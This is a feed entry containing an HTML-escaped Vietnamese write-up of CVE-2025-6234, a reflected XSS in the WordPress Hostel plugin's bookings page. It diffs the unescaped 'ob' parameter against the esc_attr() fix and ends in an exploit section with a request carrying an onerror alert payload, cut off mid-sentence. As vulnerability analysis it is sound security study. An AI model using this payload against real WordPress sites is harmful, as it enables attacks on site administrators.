      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra tr√™n plugin &lt;strong&gt;Hostel&lt;/strong&gt; c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;1.1.5.8&lt;/strong&gt;. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ &lt;strong&gt;admin&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6234&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6234&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/hostel/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt; 1.1.5.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Hostel Plugin&lt;/strong&gt;:  v1.1.5.7(vul) v√† v1.1.5.8(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán &lt;strong&gt;sanitize&lt;/strong&gt; (l√†m s·∫°ch d·ªØ li·ªáu) v√† &lt;strong&gt;escape&lt;/strong&gt; (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.&#xA;C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file &lt;strong&gt;views/bookings.html.php&lt;/strong&gt; v√† &lt;strong&gt;controllers/bookings.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;File views/bookings.html.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;p align=&amp;#34;center&amp;#34;&amp;gt;&#xA;    &amp;lt;?php if($offset &amp;gt; 0):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset - $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[previous page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt; &#xA;    &amp;lt;?php if($count &amp;gt; ($page_limit &amp;#43; $offset)):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset &amp;#43; $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[next page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt;&#x9;&#xA;&amp;lt;/p&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tham s·ªë &lt;code&gt;ob&lt;/code&gt; ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; v√† echo ra HTML attribute m√† &lt;strong&gt;kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape&lt;/strong&gt; n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° &lt;strong&gt;Reflected XSS (Cross-Site Scripting)&lt;/strong&gt;, v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;p align=&amp;#34;center&amp;#34;&amp;gt;&#xA;    &amp;lt;?php if($offset &amp;gt; 0):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset - $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo esc_attr($_GET[&amp;#39;ob&amp;#39;] ?? &amp;#39;&amp;#39;)?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[previous page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt; &#xA;    &amp;lt;?php if($count &amp;gt; ($page_limit &amp;#43; $offset)):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset &amp;#43; $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo esc_attr($_GET[&amp;#39;ob&amp;#39;] ?? &amp;#39;&amp;#39;)?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[next page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt;&#x9;&#xA;&amp;lt;/p&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m &lt;code&gt;esc_attr()&lt;/code&gt; ƒë·ªÉ encode &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/diff_code.png&#34;&#xA;    alt=&#34;Diff gi·ªØa code d·ªÖ b·ªã l·ªói v√† code ƒë√£ v√°&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff gi·ªØa code d·ªÖ b·ªã l·ªói v√† code ƒë√£ v√°&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Source: &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; l√† d·ªØ li·ªáu nh·∫≠p t·ª´ &lt;strong&gt;client (URL query string)&lt;/strong&gt;, attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n.&lt;/li&gt;&#xA;&lt;li&gt;Sink: echo trong &lt;strong&gt;HTML attribute&lt;/strong&gt; &lt;code&gt;ob=&amp;lt;?php echo @$_GET[&#39;ob&#39;]?&amp;gt;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;üëâ V√¨ source kh√¥ng ƒëi qua &lt;strong&gt;logic c·ªßa controllers&lt;/strong&gt; n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa &lt;code&gt;controllers/bookings.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒê·ªÉ &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi &lt;code&gt;if&lt;/code&gt; ch·ª©a th·∫ª &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; ph·∫£i &lt;code&gt;true&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php if($offset &amp;gt; 0):?&amp;gt;&#xA;// ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&#xA;&amp;lt;?php endif;?&amp;gt; &#xA;&amp;lt;?php if($count &amp;gt; ($page_limit &amp;#43; $offset)):?&amp;gt;&#xA;// ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&#xA;&amp;lt;?php endif;?&amp;gt;&#x9;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† &lt;code&gt;if($offset &amp;gt; 0)&lt;/code&gt;, v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m &lt;code&gt;if($count &amp;gt; ($page_limit + $offset))&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;File &lt;strong&gt;views/bookings.html.php&lt;/strong&gt; kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c &lt;strong&gt;controllers&lt;/strong&gt; g·ªçi th√¥ng qua h√†m &lt;code&gt;include()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bi·∫øn &lt;code&gt;$offset&lt;/code&gt; ƒë∆∞·ª£c &lt;strong&gt;controller&lt;/strong&gt; kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang &lt;strong&gt;view&lt;/strong&gt; (&lt;strong&gt;views/bookings.html.php&lt;/strong&gt;) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ &lt;code&gt;if&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ x√°c ƒë·ªãnh &lt;strong&gt;controller&lt;/strong&gt; n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn &lt;code&gt;$offset&lt;/code&gt; trong th∆∞ m·ª•c controllers c·ªßa plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/search_controllers.png&#34;&#xA;    alt=&#34;T√¨m bi·∫øn $offset trong th∆∞ m·ª•c controllers&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;T√¨m bi·∫øn $offset trong th∆∞ m·ª•c controllers&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;K·∫øt qu·∫£ cho th·∫•y &lt;code&gt;$offset&lt;/code&gt; ƒë∆∞·ª£c t·∫°o trong nh√°nh &lt;code&gt;default&lt;/code&gt; (&lt;strong&gt;listing bookings&lt;/strong&gt;) c·ªßa h√†m tƒ©nh &lt;code&gt;manage()&lt;/code&gt; trong class &lt;code&gt;WPHostelBookings&lt;/code&gt;, n·∫±m ·ªü file &lt;strong&gt;controllers/bookings.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Controller Code&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class WPHostelBookings {&#xA;    static function manage() {&#xA;        global $wpdb;&#xA;        $_booking = new WPHostelBooking();&#xA;&#xA;        switch(@$_GET[&amp;#39;do&amp;#39;]) {&#xA;            // other logic&#xA;            &#xA;            // list bookings&#xA;            default:&#xA;                // which bookings to show - upcoming or past?&#xA;                $type = empty($_GET[&amp;#39;type&amp;#39;]) ? &amp;#39;upcoming&amp;#39; : sanitize_text_field($_GET[&amp;#39;type&amp;#39;]);&#xA;                $offset = empty($_GET[&amp;#39;offset&amp;#39;]) ? 0 : intval($_GET[&amp;#39;offset&amp;#39;]);&#xA;                $dir = empty($_GET[&amp;#39;dir&amp;#39;]) ? &amp;#39;ASC&amp;#39; : $_GET[&amp;#39;dir&amp;#39;];&#xA;                if($dir != &amp;#39;ASC&amp;#39; and $dir != &amp;#39;DESC&amp;#39;) $dir = &amp;#39;ASC&amp;#39;;&#xA;                $odir = ($dir == &amp;#39;ASC&amp;#39;) ? &amp;#39;DESC&amp;#39; : &amp;#39;ASC&amp;#39;;&#xA;                &#xA;                // other logic&#xA;                &#xA;                // define limit (as it&amp;#39;s paginated)&#x9;&#x9;&#x9;&#x9;&#xA;                $page_limit = 20;&#xA;                $limit_sql = empty($_GET[&amp;#39;export&amp;#39;]) ? $wpdb-&amp;gt;prepare(&amp;#34;LIMIT %d, %d&amp;#34;, $offset, $page_limit) : &amp;#39;&amp;#39;; &#xA;                &#xA;                // other logic&#x9;&#xA;                &#xA;                $bookings = $wpdb-&amp;gt;get_results(&amp;#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room &#xA;                    FROM &amp;#34;.WPHOSTEL_BOOKINGS.&amp;#34; tB JOIN &amp;#34;.WPHOSTEL_ROOMS.&amp;#34; tR ON tR.id = tB.room_id&#xA;                    WHERE is_static=0 $where_sql $orderby $limit_sql&amp;#34;);&#xA;                $count = $wpdb-&amp;gt;get_var(&amp;#34;SELECT FOUND_ROWS()&amp;#34;);&#x9;&#xA;                &#xA;                // other logic&#xA;&#xA;                if(@file_exists(get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;)) include get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;;&#xA;                else include(WPHOSTEL_PATH.&amp;#34;/views/bookings.html.php&amp;#34;);&#x9;&#x9;&#x9;&#x9;  &#xA;            break;&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Ph√¢n t√≠ch bi·∫øn &lt;code&gt;$offset&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bi·∫øn &lt;code&gt;$offset&lt;/code&gt; ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë &lt;code&gt;offset&lt;/code&gt; trong &lt;strong&gt;URL&lt;/strong&gt; (&lt;code&gt;$_GET[&#39;offset&#39;]&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng c√≥ tham s·ªë =&amp;gt; m·∫∑c ƒë·ªãnh &lt;code&gt;0&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu c√≥ =&amp;gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng &lt;code&gt;intval()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$offset = empty($_GET[&amp;#39;offset&amp;#39;]) ? 0 : intval($_GET[&amp;#39;offset&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Ph√¢n t√≠ch bi·∫øn &lt;code&gt;$page_limit&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$page_limit&lt;/code&gt; ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† &lt;code&gt;20&lt;/code&gt;, d√πng k·∫øt h·ª£p v·ªõi &lt;code&gt;$offset&lt;/code&gt; ƒë·ªÉ ph√¢n trang:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// define limit (as it&amp;#39;s paginated)&#x9;&#x9;&#x9;&#x9;&#xA;$page_limit = 20;&#xA;&#xA;// LIMIT offset, 20&#xA;$limit_sql = empty($_GET[&amp;#39;export&amp;#39;]) ? $wpdb-&amp;gt;prepare(&amp;#34;LIMIT %d, %d&amp;#34;, $offset, $page_limit) : &amp;#39;&amp;#39;; &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa &lt;strong&gt;20 b·∫£n ghi&lt;/strong&gt;, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ &lt;code&gt;$offset&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Trong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;if($offset &amp;gt; 0)&lt;/code&gt; =&amp;gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ &lt;strong&gt;1 tr·ªü l√™n&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Mu·ªën &lt;code&gt;offset &amp;gt; 0&lt;/code&gt; c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t &lt;strong&gt;2 booking&lt;/strong&gt;. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu &lt;strong&gt;2 booking&lt;/strong&gt; trong database.&lt;/p&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m &lt;code&gt;include()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(@file_exists(get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;)) include get_stylesheet_directory().&amp;#39;/wphostel/bookings.html.php&amp;#39;;&#xA;else include(WPHOSTEL_PATH.&amp;#34;/views/bookings.html.php&amp;#34;);&#x9;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;WPHOSTEL_PATH&lt;/code&gt; c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file &lt;strong&gt;PHP&lt;/strong&gt; ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a &lt;code&gt;WPHOSTEL_PATH&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/search_path.png&#34;&#xA;    alt=&#34;ƒê∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c plugin&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;ƒê∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c plugin&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Request v·ªõi XSS payload&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=upcoming&amp;amp;offset=1&amp;amp;ob=&amp;#34;&amp;gt;&amp;lt;img&amp;#43;src%3D1&amp;#43;onerror%3Dalert%28document.domain%29&amp;gt; HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Payload th·ª±c t·∫ø&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#34;&amp;gt;&amp;lt;img src=x onerror=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;ƒê√≥ng th·∫ª &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; b·∫±ng k√Ω t·ª± &lt;code&gt;&amp;quot;&amp;gt;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ch√®n th√™m th·∫ª &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; c√≥ thu·ªôc t√≠nh &lt;code&gt;onerror&lt;/code&gt; ƒë·ªÉ &lt;strong&gt;k√≠ch ho·∫°t JavaScript&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;D√πng &lt;code&gt;alert(document.domain)&lt;/code&gt; thay cho &lt;code&gt;alert(1)&lt;/code&gt; nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p &lt;a 